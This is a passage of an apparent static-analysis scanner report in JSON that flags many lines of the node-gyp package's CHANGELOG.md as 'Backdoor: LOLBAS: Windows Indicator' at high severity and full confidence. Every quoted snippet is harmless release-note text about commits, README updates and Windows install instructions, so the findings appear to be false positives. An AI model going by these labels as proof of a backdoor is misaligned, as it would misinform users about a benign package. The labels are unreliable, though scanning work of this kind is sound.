                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 889,
                  "startColumn": 74,
                  "endLine": 889,
                  "endColumn": 82,
                  "snippet": {
                    "text": "ttps://github.com/nodejs/node-gyp/pull/753)\n* [[`a8d441a0a2`](https://github.com/nodejs/node-gyp/commit/a8d441a0a2)] - Update README for Windows 10 support. (Jason Williams) [#766](https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/node-gyp/commit/9049241f91)] - **gyp**: don't use links at all, just copy the files instead (Nathan Zadoks)\n* [[`8ef90348d1`](https://github.com/nodejs/node-gyp/commit/8ef90348d1)] - ",
                    "rendered": {
                      "text": "ttps://github.com/nodejs/node-gyp/pull/753)\n* [[`a8d441a0a2`](https://github.com/nodejs/node-gyp/commit/a8d441a0a2)] - Update README for Windows 10 support. (Jason Williams) [#766](https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/node-gyp/commit/9049241f91)] - **gyp**: don't use links at all, just copy the files instead (Nathan Zadoks)\n* [[`8ef90348d1`](https://github.com/nodejs/node-gyp/commit/8ef90348d1)] - ",
                      "markdown": "`ttps://github.com/nodejs/node-gyp/pull/753)\n* [[`a8d441a0a2`](https://github.com/nodejs/node-gyp/commit/a8d441a0a2)] - Update README for Windows 10 support. (Jason Williams) [#766](https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/node-gyp/commit/9049241f91)] - **gyp**: don't use links at all, just copy the files instead (Nathan Zadoks)\n* [[`8ef90348d1`](https://github.com/nodejs/node-gyp/commit/8ef90348d1)] - `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 888,
                  "startColumn": 74,
                  "endLine": 888,
                  "endColumn": 82,
                  "snippet": {
                    "text": "oordhuis) [#755](https://github.com/nodejs/node-gyp/pull/755)\n* [[`9bfa0876b4`](https://github.com/nodejs/node-gyp/commit/9bfa0876b4)] - Add support for AIX (Michael Dawson) [#753](https://github.com/nodejs/node-gyp/pull/753)\n* [[`a8d441a0a2`](https://github.com/nodejs/node-gyp/commit/a8d441a0a2)] - Update README for Windows 10 support. (Jason Williams) [#766](https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/n",
                    "rendered": {
                      "text": "oordhuis) [#755](https://github.com/nodejs/node-gyp/pull/755)\n* [[`9bfa0876b4`](https://github.com/nodejs/node-gyp/commit/9bfa0876b4)] - Add support for AIX (Michael Dawson) [#753](https://github.com/nodejs/node-gyp/pull/753)\n* [[`a8d441a0a2`](https://github.com/nodejs/node-gyp/commit/a8d441a0a2)] - Update README for Windows 10 support. (Jason Williams) [#766](https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/n",
                      "markdown": "`oordhuis) [#755](https://github.com/nodejs/node-gyp/pull/755)\n* [[`9bfa0876b4`](https://github.com/nodejs/node-gyp/commit/9bfa0876b4)] - Add support for AIX (Michael Dawson) [#753](https://github.com/nodejs/node-gyp/pull/753)\n* [[`a8d441a0a2`](https://github.com/nodejs/node-gyp/commit/a8d441a0a2)] - Update README for Windows 10 support. (Jason Williams) [#766](https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 860,
                  "startColumn": 74,
                  "endLine": 860,
                  "endColumn": 82,
                  "snippet": {
                    "text": "//github.com/nodejs/node-gyp/pull/920)\n* [[`7f1c1b960c`](https://github.com/nodejs/node-gyp/commit/7f1c1b960c)] - **gyp**: improvements for android generator (Robert Chiras) [#935](https://github.com/nodejs/node-gyp/pull/935)\n* [[`088082766c`](https://github.com/nodejs/node-gyp/commit/088082766c)] - Update Windows install instructions (Sara Itani) [#867](https://github.com/nodejs/node-gyp/pull/867)\n* [[`625c1515f9`](https://github.com/nodejs/node-gyp/commit/625c1515f9)] - **gyp**: inherit CC/CXX for CC/CXX.host (Johan Bergström) [#908](https://github.com/nodejs/node-gyp/pull/908)\n* [[`3bcb1720e4`](htt",
                    "rendered": {
                      "text": "//github.com/nodejs/node-gyp/pull/920)\n* [[`7f1c1b960c`](https://github.com/nodejs/node-gyp/commit/7f1c1b960c)] - **gyp**: improvements for android generator (Robert Chiras) [#935](https://github.com/nodejs/node-gyp/pull/935)\n* [[`088082766c`](https://github.com/nodejs/node-gyp/commit/088082766c)] - Update Windows install instructions (Sara Itani) [#867](https://github.com/nodejs/node-gyp/pull/867)\n* [[`625c1515f9`](https://github.com/nodejs/node-gyp/commit/625c1515f9)] - **gyp**: inherit CC/CXX for CC/CXX.host (Johan Bergström) [#908](https://github.com/nodejs/node-gyp/pull/908)\n* [[`3bcb1720e4`](htt",
                      "markdown": "`//github.com/nodejs/node-gyp/pull/920)\n* [[`7f1c1b960c`](https://github.com/nodejs/node-gyp/commit/7f1c1b960c)] - **gyp**: improvements for android generator (Robert Chiras) [#935](https://github.com/nodejs/node-gyp/pull/935)\n* [[`088082766c`](https://github.com/nodejs/node-gyp/commit/088082766c)] - Update Windows install instructions (Sara Itani) [#867](https://github.com/nodejs/node-gyp/pull/867)\n* [[`625c1515f9`](https://github.com/nodejs/node-gyp/commit/625c1515f9)] - **gyp**: inherit CC/CXX for CC/CXX.host (Johan Bergström) [#908](https://github.com/nodejs/node-gyp/pull/908)\n* [[`3bcb1720e4`](htt`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 846,
                  "startColumn": 84,
                  "endLine": 846,
                  "endColumn": 92,
                  "snippet": {
                    "text": "916)\n* [[`f6eab1f9e4`](https://github.com/nodejs/node-gyp/commit/f6eab1f9e4)] - **doc**: add windows-build-tools to readme (Felix Rieseberg) [#970](https://github.com/nodejs/node-gyp/pull/970)\n\n## v3.4.0 2016-06-28\n\n* [[`ce5fd04e94`](https://github.com/nodejs/node-gyp/commit/ce5fd04e94)] - **deps**: update minimatch version (delphiactual) [#961](https://github.com/nodejs/node-gyp/pull/961)\n* [[`77383ddd85`](https://github.com/nodejs/node-gyp/commit/77383ddd85)] - Replace fs.accessSync call to fs.statSync (Richard Lau) [#955](https://github.com/nodejs/node-gyp/pull/955)\n* [[`0dba4bda57`](https://github",
                    "rendered": {
                      "text": "916)\n* [[`f6eab1f9e4`](https://github.com/nodejs/node-gyp/commit/f6eab1f9e4)] - **doc**: add windows-build-tools to readme (Felix Rieseberg) [#970](https://github.com/nodejs/node-gyp/pull/970)\n\n## v3.4.0 2016-06-28\n\n* [[`ce5fd04e94`](https://github.com/nodejs/node-gyp/commit/ce5fd04e94)] - **deps**: update minimatch version (delphiactual) [#961](https://github.com/nodejs/node-gyp/pull/961)\n* [[`77383ddd85`](https://github.com/nodejs/node-gyp/commit/77383ddd85)] - Replace fs.accessSync call to fs.statSync (Richard Lau) [#955](https://github.com/nodejs/node-gyp/pull/955)\n* [[`0dba4bda57`](https://github",
                      "markdown": "`916)\n* [[`f6eab1f9e4`](https://github.com/nodejs/node-gyp/commit/f6eab1f9e4)] - **doc**: add windows-build-tools to readme (Felix Rieseberg) [#970](https://github.com/nodejs/node-gyp/pull/970)\n\n## v3.4.0 2016-06-28\n\n* [[`ce5fd04e94`](https://github.com/nodejs/node-gyp/commit/ce5fd04e94)] - **deps**: update minimatch version (delphiactual) [#961](https://github.com/nodejs/node-gyp/pull/961)\n* [[`77383ddd85`](https://github.com/nodejs/node-gyp/commit/77383ddd85)] - Replace fs.accessSync call to fs.statSync (Richard Lau) [#955](https://github.com/nodejs/node-gyp/pull/955)\n* [[`0dba4bda57`](https://github`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 828,
                  "startColumn": 74,
                  "endLine": 828,
                  "endColumn": 82,
                  "snippet": {
                    "text": ") [#873](https://github.com/nodejs/node-gyp/pull/873)\n* [[`93d7fa83c8`](https://github.com/nodejs/node-gyp/commit/93d7fa83c8)] - Upgrade semver dependency. (Ben Noordhuis) [#1107](https://github.com/nodejs/node-gyp/pull/1107)\n* [[`ff9a6fadfd`](https://github.com/nodejs/node-gyp/commit/ff9a6fadfd)] - Update link of gyp as Google code is shutting down (Peter Dave Hello) [#1061](https://github.com/nodejs/node-gyp/pull/1061)\n\n## v3.5.0 2017-01-10\n\n* [[`762d19a39e`](https://github.com/nodejs/node-gyp/commit/762d19a39e)] - \\[doc\\] merge History.md and CHANGELOG.md (Rod Vagg)\n* [[`80fc5c3d31`](https://github",
                    "rendered": {
                      "text": ") [#873](https://github.com/nodejs/node-gyp/pull/873)\n* [[`93d7fa83c8`](https://github.com/nodejs/node-gyp/commit/93d7fa83c8)] - Upgrade semver dependency. (Ben Noordhuis) [#1107](https://github.com/nodejs/node-gyp/pull/1107)\n* [[`ff9a6fadfd`](https://github.com/nodejs/node-gyp/commit/ff9a6fadfd)] - Update link of gyp as Google code is shutting down (Peter Dave Hello) [#1061](https://github.com/nodejs/node-gyp/pull/1061)\n\n## v3.5.0 2017-01-10\n\n* [[`762d19a39e`](https://github.com/nodejs/node-gyp/commit/762d19a39e)] - \\[doc\\] merge History.md and CHANGELOG.md (Rod Vagg)\n* [[`80fc5c3d31`](https://github",
                      "markdown": "`) [#873](https://github.com/nodejs/node-gyp/pull/873)\n* [[`93d7fa83c8`](https://github.com/nodejs/node-gyp/commit/93d7fa83c8)] - Upgrade semver dependency. (Ben Noordhuis) [#1107](https://github.com/nodejs/node-gyp/pull/1107)\n* [[`ff9a6fadfd`](https://github.com/nodejs/node-gyp/commit/ff9a6fadfd)] - Update link of gyp as Google code is shutting down (Peter Dave Hello) [#1061](https://github.com/nodejs/node-gyp/pull/1061)\n\n## v3.5.0 2017-01-10\n\n* [[`762d19a39e`](https://github.com/nodejs/node-gyp/commit/762d19a39e)] - \\[doc\\] merge History.md and CHANGELOG.md (Rod Vagg)\n* [[`80fc5c3d31`](https://github`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 83,
                  "endLine": 797,
                  "endColumn": 91,
                  "snippet": {
                    "text": "nodejs/node-gyp/pull/1229)\n* [[`7e803d58e0`](https://github.com/nodejs/node-gyp/commit/7e803d58e0)] - **doc**: headerify the Install instructions (Nick Schonning) [#1225](https://github.com/nodejs/node-gyp/pull/1225)\n* [[`f27599193a`](https://github.com/nodejs/node-gyp/commit/f27599193a)] - **gyp**: update xml string encoding conversion (Liu Chao) [#1203](https://github.com/nodejs/node-gyp/pull/1203)\n* [[`0a07e481f7`](https://github.com/nodejs/node-gyp/commit/0a07e481f7)] - **configure**: don't set ensure if tarball is set (Gibson Fahnestock) [#1220](https://github.com/nodejs/node-gyp/pull/1220)\n\n## v",
                    "rendered": {
                      "text": "nodejs/node-gyp/pull/1229)\n* [[`7e803d58e0`](https://github.com/nodejs/node-gyp/commit/7e803d58e0)] - **doc**: headerify the Install instructions (Nick Schonning) [#1225](https://github.com/nodejs/node-gyp/pull/1225)\n* [[`f27599193a`](https://github.com/nodejs/node-gyp/commit/f27599193a)] - **gyp**: update xml string encoding conversion (Liu Chao) [#1203](https://github.com/nodejs/node-gyp/pull/1203)\n* [[`0a07e481f7`](https://github.com/nodejs/node-gyp/commit/0a07e481f7)] - **configure**: don't set ensure if tarball is set (Gibson Fahnestock) [#1220](https://github.com/nodejs/node-gyp/pull/1220)\n\n## v",
                      "markdown": "`nodejs/node-gyp/pull/1229)\n* [[`7e803d58e0`](https://github.com/nodejs/node-gyp/commit/7e803d58e0)] - **doc**: headerify the Install instructions (Nick Schonning) [#1225](https://github.com/nodejs/node-gyp/pull/1225)\n* [[`f27599193a`](https://github.com/nodejs/node-gyp/commit/f27599193a)] - **gyp**: update xml string encoding conversion (Liu Chao) [#1203](https://github.com/nodejs/node-gyp/pull/1203)\n* [[`0a07e481f7`](https://github.com/nodejs/node-gyp/commit/0a07e481f7)] - **configure**: don't set ensure if tarball is set (Gibson Fahnestock) [#1220](https://github.com/nodejs/node-gyp/pull/1220)\n\n## v`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 795,
                  "startColumn": 83,
                  "endLine": 795,
                  "endColumn": 91,
                  "snippet": {
                    "text": "dejs/node-gyp/pull/1292)\n* [[`2da5f86ef7`](https://github.com/nodejs/node-gyp/commit/2da5f86ef7)] - **doc**: add github PR and Issue templates (Gibson Fahnestock) [#1228](https://github.com/nodejs/node-gyp/pull/1228)\n* [[`a46a770d68`](https://github.com/nodejs/node-gyp/commit/a46a770d68)] - **doc**: update proposed DCO and CoC (Mikeal Rogers) [#1229](https://github.com/nodejs/node-gyp/pull/1229)\n* [[`7e803d58e0`](https://github.com/nodejs/node-gyp/commit/7e803d58e0)] - **doc**: headerify the Install instructions (Nick Schonning) [#1225](https://github.com/nodejs/node-gyp/pull/1225)\n* [[`f27599193a`](h",
                    "rendered": {
                      "text": "dejs/node-gyp/pull/1292)\n* [[`2da5f86ef7`](https://github.com/nodejs/node-gyp/commit/2da5f86ef7)] - **doc**: add github PR and Issue templates (Gibson Fahnestock) [#1228](https://github.com/nodejs/node-gyp/pull/1228)\n* [[`a46a770d68`](https://github.com/nodejs/node-gyp/commit/a46a770d68)] - **doc**: update proposed DCO and CoC (Mikeal Rogers) [#1229](https://github.com/nodejs/node-gyp/pull/1229)\n* [[`7e803d58e0`](https://github.com/nodejs/node-gyp/commit/7e803d58e0)] - **doc**: headerify the Install instructions (Nick Schonning) [#1225](https://github.com/nodejs/node-gyp/pull/1225)\n* [[`f27599193a`](h",
                      "markdown": "`dejs/node-gyp/pull/1292)\n* [[`2da5f86ef7`](https://github.com/nodejs/node-gyp/commit/2da5f86ef7)] - **doc**: add github PR and Issue templates (Gibson Fahnestock) [#1228](https://github.com/nodejs/node-gyp/pull/1228)\n* [[`a46a770d68`](https://github.com/nodejs/node-gyp/commit/a46a770d68)] - **doc**: update proposed DCO and CoC (Mikeal Rogers) [#1229](https://github.com/nodejs/node-gyp/pull/1229)\n* [[`7e803d58e0`](https://github.com/nodejs/node-gyp/commit/7e803d58e0)] - **doc**: headerify the Install instructions (Nick Schonning) [#1225](https://github.com/nodejs/node-gyp/pull/1225)\n* [[`f27599193a`](h`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 790,
                  "startColumn": 74,
                  "endLine": 790,
                  "endColumn": 82,
                  "snippet": {
                    "text": "/github.com/nodejs/node-gyp/pull/1384)\n* [[`2580b9139e`](https://github.com/nodejs/node-gyp/commit/2580b9139e)] - Update `--nodedir` description in README. (Ben Noordhuis) [#1372](https://github.com/nodejs/node-gyp/pull/1372)\n* [[`a61360391a`](https://github.com/nodejs/node-gyp/commit/a61360391a)] - Update README with another way to install on windows (JeffAtDeere) [#1352](https://github.com/nodejs/node-gyp/pull/1352)\n* [[`47496bf6dc`](https://github.com/nodejs/node-gyp/commit/47496bf6dc)] - Fix IndexError when parsing GYP files. (Ben Noordhuis) [#1267](https://github.com/nodejs/node-gyp/pull/1267)\n* ",
                    "rendered": {
                      "text": "/github.com/nodejs/node-gyp/pull/1384)\n* [[`2580b9139e`](https://github.com/nodejs/node-gyp/commit/2580b9139e)] - Update `--nodedir` description in README. (Ben Noordhuis) [#1372](https://github.com/nodejs/node-gyp/pull/1372)\n* [[`a61360391a`](https://github.com/nodejs/node-gyp/commit/a61360391a)] - Update README with another way to install on windows (JeffAtDeere) [#1352](https://github.com/nodejs/node-gyp/pull/1352)\n* [[`47496bf6dc`](https://github.com/nodejs/node-gyp/commit/47496bf6dc)] - Fix IndexError when parsing GYP files. (Ben Noordhuis) [#1267](https://github.com/nodejs/node-gyp/pull/1267)\n* ",
                      "markdown": "`/github.com/nodejs/node-gyp/pull/1384)\n* [[`2580b9139e`](https://github.com/nodejs/node-gyp/commit/2580b9139e)] - Update `--nodedir` description in README. (Ben Noordhuis) [#1372](https://github.com/nodejs/node-gyp/pull/1372)\n* [[`a61360391a`](https://github.com/nodejs/node-gyp/commit/a61360391a)] - Update README with another way to install on windows (JeffAtDeere) [#1352](https://github.com/nodejs/node-gyp/pull/1352)\n* [[`47496bf6dc`](https://github.com/nodejs/node-gyp/commit/47496bf6dc)] - Fix IndexError when parsing GYP files. (Ben Noordhuis) [#1267](https://github.com/nodejs/node-gyp/pull/1267)\n* `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 789,
                  "startColumn": 74,
                  "endLine": 789,
                  "endColumn": 82,
                  "snippet": {
                    "text": "[#1370](https://github.com/nodejs/node-gyp/pull/1370)\n* [[`6f1286f5b2`](https://github.com/nodejs/node-gyp/commit/6f1286f5b2)] - Fix infinite install loop. (Ben Noordhuis) [#1384](https://github.com/nodejs/node-gyp/pull/1384)\n* [[`2580b9139e`](https://github.com/nodejs/node-gyp/commit/2580b9139e)] - Update `--nodedir` description in README. (Ben Noordhuis) [#1372](https://github.com/nodejs/node-gyp/pull/1372)\n* [[`a61360391a`](https://github.com/nodejs/node-gyp/commit/a61360391a)] - Update README with another way to install on windows (JeffAtDeere) [#1352](https://github.com/nodejs/node-gyp/pull/1352)",
                    "rendered": {
                      "text": "[#1370](https://github.com/nodejs/node-gyp/pull/1370)\n* [[`6f1286f5b2`](https://github.com/nodejs/node-gyp/commit/6f1286f5b2)] - Fix infinite install loop. (Ben Noordhuis) [#1384](https://github.com/nodejs/node-gyp/pull/1384)\n* [[`2580b9139e`](https://github.com/nodejs/node-gyp/commit/2580b9139e)] - Update `--nodedir` description in README. (Ben Noordhuis) [#1372](https://github.com/nodejs/node-gyp/pull/1372)\n* [[`a61360391a`](https://github.com/nodejs/node-gyp/commit/a61360391a)] - Update README with another way to install on windows (JeffAtDeere) [#1352](https://github.com/nodejs/node-gyp/pull/1352)",
                      "markdown": "`[#1370](https://github.com/nodejs/node-gyp/pull/1370)\n* [[`6f1286f5b2`](https://github.com/nodejs/node-gyp/commit/6f1286f5b2)] - Fix infinite install loop. (Ben Noordhuis) [#1384](https://github.com/nodejs/node-gyp/pull/1384)\n* [[`2580b9139e`](https://github.com/nodejs/node-gyp/commit/2580b9139e)] - Update `--nodedir` description in README. (Ben Noordhuis) [#1372](https://github.com/nodejs/node-gyp/pull/1372)\n* [[`a61360391a`](https://github.com/nodejs/node-gyp/commit/a61360391a)] - Update README with another way to install on windows (JeffAtDeere) [#1352](https://github.com/nodejs/node-gyp/pull/1352)`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 786,
                  "startColumn": 83,
                  "endLine": 786,
                  "endColumn": 91,
                  "snippet": {
                    "text": "m/nodejs/node-gyp/pull/1451)\n* [[`e5a69010ed`](https://github.com/nodejs/node-gyp/commit/e5a69010ed)] - **zos**: add search locations for libnode.x (John Barboza) [#1451](https://github.com/nodejs/node-gyp/pull/1451)\n* [[`79febace53`](https://github.com/nodejs/node-gyp/commit/79febace53)] - **doc**: update macOS information in README (Josh Parnham) [#1323](https://github.com/nodejs/node-gyp/pull/1323)\n* [[`9425448945`](https://github.com/nodejs/node-gyp/commit/9425448945)] - **gyp**: don't print xcodebuild not found errors (Gibson Fahnestock) [#1370](https://github.com/nodejs/node-gyp/pull/1370)\n* [[`",
                    "rendered": {
                      "text": "m/nodejs/node-gyp/pull/1451)\n* [[`e5a69010ed`](https://github.com/nodejs/node-gyp/commit/e5a69010ed)] - **zos**: add search locations for libnode.x (John Barboza) [#1451](https://github.com/nodejs/node-gyp/pull/1451)\n* [[`79febace53`](https://github.com/nodejs/node-gyp/commit/79febace53)] - **doc**: update macOS information in README (Josh Parnham) [#1323](https://github.com/nodejs/node-gyp/pull/1323)\n* [[`9425448945`](https://github.com/nodejs/node-gyp/commit/9425448945)] - **gyp**: don't print xcodebuild not found errors (Gibson Fahnestock) [#1370](https://github.com/nodejs/node-gyp/pull/1370)\n* [[`",
                      "markdown": "`m/nodejs/node-gyp/pull/1451)\n* [[`e5a69010ed`](https://github.com/nodejs/node-gyp/commit/e5a69010ed)] - **zos**: add search locations for libnode.x (John Barboza) [#1451](https://github.com/nodejs/node-gyp/pull/1451)\n* [[`79febace53`](https://github.com/nodejs/node-gyp/commit/79febace53)] - **doc**: update macOS information in README (Josh Parnham) [#1323](https://github.com/nodejs/node-gyp/pull/1323)\n* [[`9425448945`](https://github.com/nodejs/node-gyp/commit/9425448945)] - **gyp**: don't print xcodebuild not found errors (Gibson Fahnestock) [#1370](https://github.com/nodejs/node-gyp/pull/1370)\n* [[``"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 760,
                  "startColumn": 83,
                  "endLine": 760,
                  "endColumn": 91,
                  "snippet": {
                    "text": "1534)\n\n## v3.8.0 2018-08-09\n\n* [[`c5929cb4fe`](https://github.com/nodejs/node-gyp/commit/c5929cb4fe)] - **doc**: update Xcode preferences tab name. (Ivan Daniluk) [#1330](https://github.com/nodejs/node-gyp/pull/1330)\n* [[`8b488da8b9`](https://github.com/nodejs/node-gyp/commit/8b488da8b9)] - **doc**: update link to commit guidelines (Jonas Hermsmeier) [#1456](https://github.com/nodejs/node-gyp/pull/1456)\n* [[`b4fe8c16f9`](https://github.com/nodejs/node-gyp/commit/b4fe8c16f9)] - **doc**: fix visual studio links (Bartosz Sosnowski) [#1490](https://github.com/nodejs/node-gyp/pull/1490)\n* [[`536759c7e9`](h",
                    "rendered": {
                      "text": "1534)\n\n## v3.8.0 2018-08-09\n\n* [[`c5929cb4fe`](https://github.com/nodejs/node-gyp/commit/c5929cb4fe)] - **doc**: update Xcode preferences tab name. (Ivan Daniluk) [#1330](https://github.com/nodejs/node-gyp/pull/1330)\n* [[`8b488da8b9`](https://github.com/nodejs/node-gyp/commit/8b488da8b9)] - **doc**: update link to commit guidelines (Jonas Hermsmeier) [#1456](https://github.com/nodejs/node-gyp/pull/1456)\n* [[`b4fe8c16f9`](https://github.com/nodejs/node-gyp/commit/b4fe8c16f9)] - **doc**: fix visual studio links (Bartosz Sosnowski) [#1490](https://github.com/nodejs/node-gyp/pull/1490)\n* [[`536759c7e9`](h",
                      "markdown": "`1534)\n\n## v3.8.0 2018-08-09\n\n* [[`c5929cb4fe`](https://github.com/nodejs/node-gyp/commit/c5929cb4fe)] - **doc**: update Xcode preferences tab name. (Ivan Daniluk) [#1330](https://github.com/nodejs/node-gyp/pull/1330)\n* [[`8b488da8b9`](https://github.com/nodejs/node-gyp/commit/8b488da8b9)] - **doc**: update link to commit guidelines (Jonas Hermsmeier) [#1456](https://github.com/nodejs/node-gyp/pull/1456)\n* [[`b4fe8c16f9`](https://github.com/nodejs/node-gyp/commit/b4fe8c16f9)] - **doc**: fix visual studio links (Bartosz Sosnowski) [#1490](https://github.com/nodejs/node-gyp/pull/1490)\n* [[`536759c7e9`](h`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 759,
                  "startColumn": 83,
                  "endLine": 759,
                  "endColumn": 91,
                  "snippet": {
                    "text": "* [[`0c6bf530a0`](https://github.com/nodejs/node-gyp/commit/0c6bf530a0)] - **lib**: use print() for python version detection (GreenAddress) [#1534](https://github.com/nodejs/node-gyp/pull/1534)\n\n## v3.8.0 2018-08-09\n\n* [[`c5929cb4fe`](https://github.com/nodejs/node-gyp/commit/c5929cb4fe)] - **doc**: update Xcode preferences tab name. (Ivan Daniluk) [#1330](https://github.com/nodejs/node-gyp/pull/1330)\n* [[`8b488da8b9`](https://github.com/nodejs/node-gyp/commit/8b488da8b9)] - **doc**: update link to commit guidelines (Jonas Hermsmeier) [#1456](https://github.com/nodejs/node-gyp/pull/1456)\n* [[`b4fe8c16",
                    "rendered": {
